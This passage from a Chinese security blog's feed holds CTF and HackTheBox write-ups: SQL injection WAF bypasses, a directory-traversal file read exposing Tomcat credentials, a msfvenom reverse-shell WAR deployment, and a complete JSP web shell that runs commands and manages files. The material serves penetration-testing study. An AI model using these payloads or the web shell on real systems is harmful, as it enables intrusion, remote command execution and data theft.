&lt;pre&gt;&lt;code&gt;return preg_match(&amp;quot;/;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;amp;|like|-|`/i&amp;quot;, $id); 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;stat意味着过滤了sys.schema_table_statistics_with_buffer,sys.x$schema_table_statistics_with_buffer,mysql.innodb_table_stats&lt;/p&gt;
&lt;p&gt;or意味着过滤了information_schema&lt;/p&gt;
&lt;p&gt;由waf想到了union注入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?id=0%27union/**/select/**/1,2,3%23
Array ( [0] =&amp;gt; 1 [id] =&amp;gt; 1 [1] =&amp;gt; 2 [username] =&amp;gt; 2 [2] =&amp;gt; 3 [password] =&amp;gt; 3 )
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到库名：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?id=0%27union/**/select/**/1,database(),3%23
sqlidb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上述bypass infomation_schema的方法都被过滤了，不过leon师傅在一次开发当中发现了另一个库：&lt;code&gt;sys.schema_tables_with_full_table_scans&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?id=0&#39;/**/union/**/select/**/1,group_concat(object_name),3/**/from/**/sys.schema_tables_with_full_table_scans%23
#users,flllaaaggg,sys_config
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来是无列名注入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?id=0&#39;/**/union/**/select/**/1,(select/**/a.2/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flllaaaggg)a/**/limit/**/1,1),3%23
flag{60325f20416b40b11b6049734bad11cf}
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>HackTheBox_challenges</title>
        <link>https://anthem-whisper.github.io/p/hackthebox_challenges/</link>
        <pubDate>Sat, 25 Jul 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/hackthebox_challenges/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181059.jpeg" alt="Featured image of post HackTheBox_challenges" /&gt;&lt;h3 id=&#34;emdee-five-for-life&#34;&gt;Emdee five for life&lt;/h3&gt;
&lt;p&gt;考点：python正则，request模块&lt;/p&gt;
&lt;p&gt;打开页面，给你一个字符串，md5加密后提交，太慢或者错了就会Too slow：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181105.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;emdee five for life&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body style=&amp;quot;background-color:powderblue;&amp;quot;&amp;gt;
&amp;lt;h1 align=&#39;center&#39;&amp;gt;MD5 encrypt this string&amp;lt;/h1&amp;gt;&amp;lt;h3 align=&#39;center&#39;&amp;gt;LWod6afkxEjJV8KZeLRO&amp;lt;/h3&amp;gt;&amp;lt;center&amp;gt;&amp;lt;form action=&amp;quot;&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;hash&amp;quot; placeholder=&amp;quot;MD5&amp;quot; align=&#39;center&#39;&amp;gt;&amp;lt;/input&amp;gt;
&amp;lt;/br&amp;gt;
&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Submit&amp;quot;&amp;gt;&amp;lt;/input&amp;gt;
&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当然是脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
import requests
import re
import hashlib
 
while 1:
    host = &amp;quot;http://docker.hackthebox.eu:32046/&amp;quot;
    req = requests.session()
    r = req.get(url=host)
    #print(r.text)
    pattern = re.compile(r&amp;quot;&amp;lt;h3 align=&#39;center&#39;&amp;gt;(\S+)&amp;lt;/h3&amp;gt;&amp;quot;)
    h3 = pattern.findall(r.text)
    md5 = hashlib.md5(h3[0].encode(&#39;utf-8&#39;)).hexdigest()
    #print(h3[0],md5)
    data={&#39;hash&#39;:md5}
    s = req.post(url=host, data=data)
    
    if &#39;Too slow!&#39; in s.text:
        print(&#39;Too slow!&#39;)
 
    else:
        print(s.text)
        break
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第11行那里用了 &lt;code&gt;(\S+)&lt;/code&gt; 就会返回LWod6afkxEjJV8KZeLRO&lt;/p&gt;
&lt;p&gt;第二次POST过去的时候需要用session不然就会too slow&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;freelancer&#34;&gt;FreeLancer&lt;/h3&gt;
&lt;p&gt;考点：sqli&lt;/p&gt;
&lt;p&gt;打开页面，有一个表单&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181111.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;本来以为是XSS，但是无论怎么样提交都是500，后来看源码，发现了 &lt;code&gt;&amp;lt;!-- &amp;lt;a href=&amp;quot;portfolio.php?id=3&amp;quot;&amp;gt;Portfolio 3&amp;lt;/a&amp;gt; --&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;访问发现sql注入，Union一把梭可以发现：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;表名：portfolio,safeadmin 
safeadmin列名：id,username,password,created_at
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注出来用户 &lt;code&gt;safeamd&lt;/code&gt; 密码 &lt;code&gt;$2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;不过没什么用，因为我们目的是要getshell，其实也不用getshell，只要你用dirbuster爆破出这个文件 &lt;code&gt;/var/www/html/administrat/panel.php&lt;/code&gt; 这个文件，直接读取他就好了&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HackTheBox::Tabby</title>
        <link>https://anthem-whisper.github.io/p/hacktheboxtabby/</link>
        <pubDate>Sun, 19 Jul 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/hacktheboxtabby/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180858.png" alt="Featured image of post HackTheBox::Tabby" /&gt;&lt;h3 id=&#34;信息搜集&#34;&gt;信息搜集&lt;/h3&gt;
&lt;p&gt;扫一波端口：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@wh1sper:~/tools/dirsearch# nmap -sT 10.10.10.194
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 05:37 PDT
Nmap scan report for 10.10.10.194 (10.10.10.194)
Host is up (0.27s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
 
Nmap done: 1 IP address (1 host up) scanned in 639.04 seconds
root@wh1sper:~/tools/dirsearch#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;访问发现是个Tomcat的默认页面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180905.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;访问80端口，在首页发现news.php，不过这个域名没办法访问，把他修改成靶机的内网ip即可访问：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180912.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;目录穿越任意文件读取&#34;&gt;目录穿越+任意文件读取&lt;/h3&gt;
&lt;p&gt;在 &lt;code&gt;file=&lt;/code&gt; 参数我们可以想到目录穿越漏洞，访问 &lt;code&gt;http://10.10.10.194/news.php?file=../../../../etc/passwd&lt;/code&gt; 可以获取到passwd文件：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到这个靶机上面出了root还用tomcat、ash等用户。&lt;/p&gt;
&lt;p&gt;但是这个目录穿越只是任意文件读取，并不是文件包含漏洞：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@wh1sper:~/tools/dirsearch# curl http://10.10.10.194/news.php?file=../../../../var/www/html/news.php
&amp;lt;?php
$file = $_GET[&#39;file&#39;];
$fh = fopen(&amp;quot;files/$file&amp;quot;,&amp;quot;r&amp;quot;);
while ($line = fgets($fh)) {
  echo($line);
}
fclose($fh);
?&amp;gt;
root@wh1sper:~/tools/dirsearch#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们可以看到他直接输出了PHP的代码，并没有去当作PHP执行，所以是任意文件读取。&lt;/p&gt;
&lt;p&gt;我们回到Tomcat页面，页面最后一行提示了我们 &lt;code&gt;Users are defined in /etc/tomcat9/tomcat-users.xml&lt;/code&gt; ，如果我们能读取这个文件的话，我们就可以用里面的用户名密码登录tomcat的管理后台了&lt;/p&gt;
&lt;p&gt;但是页面提示的/etc/tomcat-users.xml并不能读取，后来网上查了下tomcat默认安装路径可能是/usr/share/tomcat9，于是尝试 &lt;code&gt;/usr/share/tomcat9/etc/tomcat-users.xml&lt;/code&gt; ，成功读取到了文件：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@wh1sper:~/HTB/machine/Tabby# curl http://10.10.10.194/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the &amp;quot;License&amp;quot;); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at
 
      http://www.apache.org/licenses/LICENSE-2.0
 
  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an &amp;quot;AS IS&amp;quot; BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
--&amp;gt;
&amp;lt;tomcat-users xmlns=&amp;quot;http://tomcat.apache.org/xml&amp;quot;
              xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;
              xsi:schemaLocation=&amp;quot;http://tomcat.apache.org/xml tomcat-users.xsd&amp;quot;
              version=&amp;quot;1.0&amp;quot;&amp;gt;
&amp;lt;!--
  NOTE:  By default, no user is included in the &amp;quot;manager-gui&amp;quot; role required
  to operate the &amp;quot;/manager/html&amp;quot; web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
--&amp;gt;
&amp;lt;!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the &amp;lt;!.. ..&amp;gt; that surrounds
  them. You will also need to set the passwords to something appropriate.
--&amp;gt;
&amp;lt;!--
  &amp;lt;role rolename=&amp;quot;tomcat&amp;quot;/&amp;gt;
  &amp;lt;role rolename=&amp;quot;role1&amp;quot;/&amp;gt;
  &amp;lt;user username=&amp;quot;tomcat&amp;quot; password=&amp;quot;&amp;lt;must-be-changed&amp;gt;&amp;quot; roles=&amp;quot;tomcat&amp;quot;/&amp;gt;
  &amp;lt;user username=&amp;quot;both&amp;quot; password=&amp;quot;&amp;lt;must-be-changed&amp;gt;&amp;quot; roles=&amp;quot;tomcat,role1&amp;quot;/&amp;gt;
  &amp;lt;user username=&amp;quot;role1&amp;quot; password=&amp;quot;&amp;lt;must-be-changed&amp;gt;&amp;quot; roles=&amp;quot;role1&amp;quot;/&amp;gt;
--&amp;gt;
   &amp;lt;role rolename=&amp;quot;admin-gui&amp;quot;/&amp;gt;
   &amp;lt;role rolename=&amp;quot;manager-script&amp;quot;/&amp;gt;
   &amp;lt;user username=&amp;quot;tomcat&amp;quot; password=&amp;quot;$3cureP4s5w0rd123!&amp;quot; roles=&amp;quot;admin-gui,manager-script&amp;quot;/&amp;gt;
&amp;lt;/tomcat-users&amp;gt;
root@wh1sper:~/HTB/machine/Tabby#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后后台地址是： &lt;code&gt;10.10.10.194:8080/manager/&lt;/code&gt; (这个登录不上)，另一个是 &lt;code&gt;10.10.10.194:8080/host-manager/html&lt;/code&gt; 输入用户名tomcat密码$3cureP4s5w0rd123!就可以进去&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180921.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;我们目的是Getshell，但是这个后台并不能文件上传，但但是tomcat可以独特地通过命令行去部署.war包&lt;/p&gt;
&lt;h3 id=&#34;curl远程部署恶意war包&#34;&gt;Curl远程部署恶意war包&lt;/h3&gt;
&lt;p&gt;在tomcat-users.xml中写了tomcat用户没有manager-gui角色，因此无法登录manager/html页面，但是tomcat用户还具有manager-script角色，所以可以执行命令&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180957.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181009.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;tomcat命令行部署war包：https://blog.csdn.net/chumo6161/article/details/100615971&lt;/p&gt;
&lt;p&gt;tomcat manageapp操作方法：&lt;a class=&#34;link&#34; href=&#34;http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html#Executing_Manager_Commands_With_Ant&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们用一个免杀jsp马来制作好war包，然后通过curl远程部署到靶机上面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181020.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;我的免杀base64用不了，换了msf的马：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@wh1sper:~/HTB/machine/Tabby# msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.14.81 lport=10086 -f war -o Formalhaut.war
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of war file: 1538 bytes
Saved as: Formalhaut.war
root@wh1sper:~/HTB/machine/Tabby# ls
Formalhaut.war  JSP.jsp  shell.jsp  shell.war  wh1sper.war
root@wh1sper:~/HTB/machine/Tabby# unzip Formalhaut.war 
Archive:  Formalhaut.war
   creating: META-INF/
  inflating: META-INF/MANIFEST.MF    
   creating: WEB-INF/
  inflating: WEB-INF/web.xml         
  inflating: ubvqchbvesep.jsp        
root@wh1sper:~/HTB/machine/Tabby#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;监听10086端口，访问jsp文件我们就能收到shell：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181033.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;同理可以上传一个jsp菜刀版用蚁剑连接使用图形化文件管理系统：&lt;/p&gt;
&lt;p&gt;jsp菜刀版&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;%@page import=&amp;quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&amp;quot;%&amp;gt;
&amp;lt;%!String Pwd = &amp;quot;pass&amp;quot;;
 
    String EC(String s, String c) throws Exception {
        return s;
    }//new String(s.getBytes(&amp;quot;ISO-8859-1&amp;quot;),c);}
 
    Connection GC(String s) throws Exception {
        String[] x = s.trim().split(&amp;quot;\r\n&amp;quot;);
        Class.forName(x[0].trim()).newInstance();
        Connection c = DriverManager.getConnection(x[1].trim());
        if (x.length &amp;gt; 2) {
            c.setCatalog(x[2].trim());
        }
        return c;
    }
 
    void AA(StringBuffer sb) throws Exception {
        File r[] = File.listRoots();
        for (int i = 0; i &amp;lt; r.length; i++) {
            sb.append(r[i].toString().substring(0, 2));
        }
    }
 
    void BB(String s, StringBuffer sb) throws Exception {
        File oF = new File(s), l[] = oF.listFiles();
        String sT, sQ, sF = &amp;quot;&amp;quot;;
        java.util.Date dt;
        SimpleDateFormat fm = new SimpleDateFormat(&amp;quot;yyyy-MM-dd HH:mm:ss&amp;quot;);
        for (int i = 0; i &amp;lt; l.length; i++) {
            dt = new java.util.Date(l[i].lastModified());
            sT = fm.format(dt);
            sQ = l[i].canRead() ? &amp;quot;R&amp;quot; : &amp;quot;&amp;quot;;
            sQ += l[i].canWrite() ? &amp;quot; W&amp;quot; : &amp;quot;&amp;quot;;
            if (l[i].isDirectory()) {
                sb.append(l[i].getName() + &amp;quot;/\t&amp;quot; + sT + &amp;quot;\t&amp;quot; + l[i].length()
                        + &amp;quot;\t&amp;quot; + sQ + &amp;quot;\n&amp;quot;);
            } else {
                sF += l[i].getName() + &amp;quot;\t&amp;quot; + sT + &amp;quot;\t&amp;quot; + l[i].length() + &amp;quot;\t&amp;quot;
                        + sQ + &amp;quot;\n&amp;quot;;
            }
        }
        sb.append(sF);
    }
 
    void EE(String s) throws Exception {
        File f = new File(s);
        if (f.isDirectory()) {
            File x[] = f.listFiles();
            for (int k = 0; k &amp;lt; x.length; k++) {
                if (!x[k].delete()) {
                    EE(x[k].getPath());
                }
            }
        }
        f.delete();
    }
 
    void FF(String s, HttpServletResponse r) throws Exception {
        int n;
        byte[] b = new byte[512];
        r.reset();
        ServletOutputStream os = r.getOutputStream();
        BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));
        os.write((&amp;quot;-&amp;gt;&amp;quot; + &amp;quot;|&amp;quot;).getBytes(), 0, 3);
        while ((n = is.read(b, 0, 512)) != -1) {
            os.write(b, 0, n);
        }
        os.write((&amp;quot;|&amp;quot; + &amp;quot;&amp;lt;-&amp;quot;).getBytes(), 0, 3);
        os.close();
        is.close();
    }
 
    void GG(String s, String d) throws Exception {
        String h = &amp;quot;0123456789ABCDEF&amp;quot;;
        int n;
        File f = new File(s);
        f.createNewFile();
        FileOutputStream os = new FileOutputStream(f);
        for (int i = 0; i &amp;lt; d.length(); i += 2) {
            os
                    .write((h.indexOf(d.charAt(i)) &amp;lt;&amp;lt; 4 | h.indexOf(d
                            .charAt(i + 1))));
        }
        os.close();
    }
  
    void HH(String s, String d) throws Exception {
        File sf = new File(s), df = new File(d);
        if (sf.isDirectory()) {
            if (!df.exists()) {
                df.mkdir();
            }
            File z[] = sf.listFiles();
            for (int j = 0; j &amp;lt; z.length; j++) {
                HH(s + &amp;quot;/&amp;quot; + z[j].getName(), d + &amp;quot;/&amp;quot; + z[j].getName());
            }
        } else {
            FileInputStream is = new FileInputStream(sf);
            FileOutputStream os = new FileOutputStream(df);
            int n;
            byte[] b = new byte[512];
            while ((n = is.read(b, 0, 512)) != -1) {
                os.write(b, 0, n);
            }
            is.close();
            os.close();
        }
    }
 
    void II(String s, String d) throws Exception {
        File sf = new File(s), df = new File(d);
        sf.renameTo(df);
    }
 
    void JJ(String s) throws Exception {
        File f = new File(s);
        f.mkdir();
    }
 
    void KK(String s, String t) throws Exception {
        File f = new File(s);
        SimpleDateFormat fm = new SimpleDateFormat(&amp;quot;yyyy-MM-dd HH:mm:ss&amp;quot;);
        java.util.Date dt = fm.parse(t);
        f.setLastModified(dt.getTime());
    }
 
    void LL(String s, String d) throws Exception {
        URL u = new URL(s);
        int n;
        FileOutputStream os = new FileOutputStream(d);
        HttpURLConnection h = (HttpURLConnection) u.openConnection();
        InputStream is = h.getInputStream();
        byte[] b = new byte[512];
        while ((n = is.read(b, 0, 512)) != -1) {
            os.write(b, 0, n);
        }
        os.close();
        is.close();
        h.disconnect();
    }
 
    void MM(InputStream is, StringBuffer sb) throws Exception {
        String l;
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        while ((l = br.readLine()) != null) {
            sb.append(l + &amp;quot;\r\n&amp;quot;);
        }
    } 
 
    void NN(String s, StringBuffer sb) throws Exception {
        Connection c = GC(s);
        ResultSet r = c.getMetaData().getCatalogs();
        while (r.next()) {
            sb.append(r.getString(1) + &amp;quot;\t&amp;quot;);
        }
        r.close();
        c.close();
    }
 
    void OO(String s, StringBuffer sb) throws Exception {
        Connection c = GC(s);
        String[] t = { &amp;quot;TABLE&amp;quot; };
        ResultSet r = c.getMetaData().getTables(null, null, &amp;quot;%&amp;quot;, t);
        while (r.next()) {
            sb.append(r.getString(&amp;quot;TABLE_NAME&amp;quot;) + &amp;quot;\t&amp;quot;);
        }
        r.close();
        c.close();
    }
 
    void PP(String s, StringBuffer sb) throws Exception {
        String[] x = s.trim().split(&amp;quot;\r\n&amp;quot;);
        Connection c = GC(s);
        Statement m = c.createStatement(1005, 1007);
        ResultSet r = m.executeQuery(&amp;quot;select * from &amp;quot; + x[3]);
        ResultSetMetaData d = r.getMetaData();
        for (int i = 1; i &amp;lt;= d.getColumnCount(); i++) {
            sb.append(d.getColumnName(i) + &amp;quot; (&amp;quot; + d.getColumnTypeName(i)
                    + &amp;quot;)\t&amp;quot;);
        }
        r.close();
        m.close();
        c.close();
    }
 
    void QQ(String cs, String s, String q, StringBuffer sb) throws Exception {
        int i;
        Connection c = GC(s);
        Statement m = c.createStatement(1005, 1008);
        try {
            ResultSet r = m.executeQuery(q);
            ResultSetMetaData d = r.getMetaData();
            int n = d.getColumnCount();
            for (i = 1; i &amp;lt;= n; i++) {
                sb.append(d.getColumnName(i) + &amp;quot;\t|\t&amp;quot;);
            }
            sb.append(&amp;quot;\r\n&amp;quot;);
            while (r.next()) {
                for (i = 1; i &amp;lt;= n; i++) {
                    sb.append(EC(r.getString(i), cs) + &amp;quot;\t|\t&amp;quot;);
                }
                sb.append(&amp;quot;\r\n&amp;quot;);
            }
            r.close();
        } catch (Exception e) {
            sb.append(&amp;quot;Result\t|\t\r\n&amp;quot;);
            try {
                m.executeUpdate(q);
                sb.append(&amp;quot;Execute Successfully!\t|\t\r\n&amp;quot;);
            } catch (Exception ee) {
                sb.append(ee.toString() + &amp;quot;\t|\t\r\n&amp;quot;);
            }
        }
        m.close();
        c.close();
    }%&amp;gt;
      
      
&amp;lt;%
    String cs = request.getParameter(&amp;quot;z0&amp;quot;)==null?&amp;quot;gbk&amp;quot;: request.getParameter(&amp;quot;z0&amp;quot;) + &amp;quot;&amp;quot;;
    request.setCharacterEncoding(cs);
    response.setContentType(&amp;quot;text/html;charset=&amp;quot; + cs);
    String Z = EC(request.getParameter(Pwd) + &amp;quot;&amp;quot;, cs);
    String z1 = EC(request.getParameter(&amp;quot;z1&amp;quot;) + &amp;quot;&amp;quot;, cs);
    String z2 = EC(request.getParameter(&amp;quot;z2&amp;quot;) + &amp;quot;&amp;quot;, cs);
    StringBuffer sb = new StringBuffer(&amp;quot;&amp;quot;);
    try {
        sb.append(&amp;quot;-&amp;gt;&amp;quot; + &amp;quot;|&amp;quot;);
        if (Z.equals(&amp;quot;A&amp;quot;)) {
            String s = new File(application.getRealPath(request
                    .getRequestURI())).getParent();
            sb.append(s + &amp;quot;\t&amp;quot;);
            if (!s.substring(0, 1).equals(&amp;quot;/&amp;quot;)) {
                AA(sb);
            }
        } else if (Z.equals(&amp;quot;B&amp;quot;)) {
            BB(z1, sb);
        } else if (Z.equals(&amp;quot;C&amp;quot;)) {
            String l = &amp;quot;&amp;quot;;
            BufferedReader br = new BufferedReader(
                    new InputStreamReader(new FileInputStream(new File(
                            z1))));
            while ((l = br.readLine()) != null) {
                sb.append(l + &amp;quot;\r\n&amp;quot;);
            }
            br.close();
        } else if (Z.equals(&amp;quot;D&amp;quot;)) {
            BufferedWriter bw = new BufferedWriter(
                    new OutputStreamWriter(new FileOutputStream(
                            new File(z1))));
            bw.write(z2);
            bw.close();
            sb.append(&amp;quot;1&amp;quot;);
        } else if (Z.equals(&amp;quot;E&amp;quot;)) {
            EE(z1);
            sb.append(&amp;quot;1&amp;quot;);
        } else if (Z.equals(&amp;quot;F&amp;quot;)) {
            FF(z1, response);
        } else if (Z.equals(&amp;quot;G&amp;quot;)) {
            GG(z1, z2);
            sb.append(&amp;quot;1&amp;quot;);
        } else if (Z.equals(&amp;quot;H&amp;quot;)) {
            HH(z1, z2);
            sb.append(&amp;quot;1&amp;quot;);
        } else if (Z.equals(&amp;quot;I&amp;quot;)) {
            II(z1, z2);
            sb.append(&amp;quot;1&amp;quot;);
        } else if (Z.equals(&amp;quot;J&amp;quot;)) {
            JJ(z1);
            sb.append(&amp;quot;1&amp;quot;);
        } else if (Z.equals(&amp;quot;K&amp;quot;)) {
            KK(z1, z2);
            sb.append(&amp;quot;1&amp;quot;);
        } else if (Z.equals(&amp;quot;L&amp;quot;)) {
            LL(z1, z2);
            sb.append(&amp;quot;1&amp;quot;);
        } else if (Z.equals(&amp;quot;M&amp;quot;)) {
            String[] c = { z1.substring(2), z1.substring(0, 2), z2 };
            Process p = Runtime.getRuntime().exec(c);
            MM(p.getInputStream(), sb);
            MM(p.getErrorStream(), sb);
        } else if (Z.equals(&amp;quot;N&amp;quot;)) {
            NN(z1, sb);
        } else if (Z.equals(&amp;quot;O&amp;quot;)) {
            OO(z1, sb);
        } else if (Z.equals(&amp;quot;P&amp;quot;)) {
            PP(z1, sb);
        } else if (Z.equals(&amp;quot;Q&amp;quot;)) {
            QQ(cs, z1, z2, sb);
        }
    } catch (Exception e) {
        sb.append(&amp;quot;ERROR&amp;quot; + &amp;quot;:// &amp;quot; + e.toString());
    }
    sb.append(&amp;quot;|&amp;quot; + &amp;quot;&amp;lt;-&amp;quot;);
    out.print(sb.toString());
%&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;提权&#34;&gt;提权&lt;/h3&gt;
&lt;h4 id=&#34;爆破web路径压缩包密码&#34;&gt;爆破web路径压缩包密码&lt;/h4&gt;
&lt;p&gt;翻看他的web路径/var/www/html，在file文件夹下有一个加密的压缩包&lt;/p&gt;
&lt;p&gt;蚁剑下载下来本地破解下密码；&lt;/p&gt;
&lt;p&gt;。。。尝试了很多方法，跑了很久跑不出来，，最后还是去翻了wp，使用kali自带的/usr/share/wordlists/rockyou.txt.gz字典进行破解：&lt;/p&gt;
&lt;p&gt;解压字典：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@wh1sper:/usr/share/wordlists# ls
